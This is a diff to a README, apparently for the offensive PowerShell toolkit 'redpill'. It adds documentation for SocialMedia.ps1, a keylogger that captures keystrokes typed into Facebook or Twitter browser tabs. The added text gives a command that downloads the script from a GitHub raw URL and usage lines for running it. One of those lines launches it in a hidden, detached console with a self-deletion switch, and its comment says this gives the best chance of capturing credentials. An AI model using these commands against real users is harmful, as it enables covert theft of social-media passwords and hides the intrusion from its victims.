@@ -330,3 +330,42 @@ Winget search games
 4 - Send Hopmon.vbs (or compile to EXE) to target for manual execution.
 ```
 
+<br />
+
+## SocialMedia.ps1
+   
+|Binary Name|Description|Privileges|Notes|
+|---|---|---|---|
+|[SocialMedia](https:77)|Capture keyboard keystrokes from Facebook or Twitter|UserLand,Adminstrator|browser (active tab) keystrokes capture|
+
+|Parameter|Description|value|Default value|
+|---|---|---|---|
+|Action|Start or Stop keylogger|Start, Stop|Start|
+|Delay|Milliseconds delay between loops|1000|1000|
+|Force|Switch to bypass Is_Browser_Active? checks|Switch|Switch|
+|AutoDel|Switch that deletes this cmdlet in the end|Switch|Switch|
+
+<br />
+
+**Download cmdlet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/SocialMedia.ps1" -OutFile "SocialMedia.ps1"
+```
+
+**execute:**
+```powershell
+## Start browser keylogger capture
+.\SocialMedia.ps1 -action 'start'
+
+## Use 5 seconds delay between each loop
+.\SocialMedia.ps1 -delay '5000'
+
+## Bypass Is_Browser_Active? checks
+.\SocialMedia.ps1 -force
+
+## Stop keylogger and leak keystrokes on screen
+.\SocialMedia.ps1 -action 'stop'
+
+## Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials
+Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -action 'start' -delay '200' -force -autodel" 
+```
